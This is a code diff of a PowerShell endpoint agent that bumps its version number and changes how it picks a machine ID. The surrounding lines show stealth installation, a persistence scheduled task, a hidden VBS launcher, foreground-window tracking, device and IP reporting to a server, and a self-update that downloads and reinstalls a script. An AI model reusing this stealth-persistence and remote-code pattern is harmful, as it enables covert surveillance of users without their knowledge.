@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 1.7.2
+# Version: 1.7.3
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
@@ -69,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.7.2..."
+        Log-Message "Initiating User-Level Persistent Install v1.7.3..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.2" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.3" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -112,9 +112,9 @@ try {
         Install-StealthAgent
     }
 
-    # Stable ID detection (Registry is faster and more reliable than CIM if CIM hangs)
-    $AgentId = try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction Stop).MachineGuid } catch { 
-        try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop).UUID } catch { "$($env:COMPUTERNAME)" }
+    # Use BIOS UUID first for consistency with Intune/Legacy records
+    $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop).UUID } catch { 
+        try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction Stop).MachineGuid } catch { "$($env:COMPUTERNAME)" }
     }
     $SerialNumber = try { (Get-ItemProperty -Path 'HKLM:\HARDWARE\DESCRIPTION\System\BIOS' -ErrorAction Stop).SystemSerialNumber } catch { "Unknown" }
     
@@ -130,7 +130,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.7.2 Started (Admin=$IsAdmin). ID: $AgentId"
+    Log-Message "Agent v1.7.3 Started (Admin=$IsAdmin). ID: $AgentId"
     
     # Define Win32 API for foreground window
     $Win32Code = @'
@@ -230,7 +230,7 @@ try {
             }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.2"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.3"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
@@ -292,7 +292,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.2")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.3")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
